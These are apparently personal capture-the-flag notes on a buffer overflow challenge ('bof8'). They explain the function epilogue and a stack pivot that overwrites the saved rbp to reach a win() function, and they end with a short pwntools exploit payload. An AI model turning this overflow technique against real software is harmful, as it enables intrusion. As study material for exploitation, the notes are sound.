- `checksec`
  ![[bof8_JHT-1.png]]
- decompile:
  ![[bof8_JHT-2.png]]
  ![[bof8_JHT-3.png]]
  ![[bof8_JHT-4.png]]
  ![[bof8_JHT-5.png]]
- NX off, no canary, `win()` -> [[stack pivot]]
- here `win()` is stored in 0x404850
  ![[bof8_JHT-6.png]]
- we'll change the saved rbp so that after `buy`, when `ret` in `main()`, new `rsp` will be 0x404850, or `win()`
- recall [[func epilogue]]:
	- `leave` or (`mov rsp, rbp` and `pop rbp`) : set rsp = rbp address value, which is saved rbp, to remove N bytes of local var, buf
		- `pop rbp` or (`mov rbp, [rsp]` and `add rsp, 8`) : set rbp = value at rsp, which is main's rbp address
	- `ret` or (`mov rip, [rsp]` and `add rsp, 8`) : jump to saved rip
- `leave` will assign `rsp` as saved rbp, add 8 bytes to `rsp`. `ret` will jump to new `rsp` = saved rbp + 8
- if payload = offset + 0x404850:
  ![[bof8_JHT-7.png]]
  ![[bof8_JHT-8.png]]
- so to set correct addr, sub 8 bytes from 0x404850 -> 0x404848:
  ![[bof8_JHT-9.png]]
  ![[bof8_JHT-10.png]]
- payload:
  ```python
	payload = b'A' * 32 + p64(0x404848)
	p.sendlineafter(b'> ', b'1')
	p.sendafter(b'> ', payload)
	p.sendlineafter(b'> ', b'3')
  ```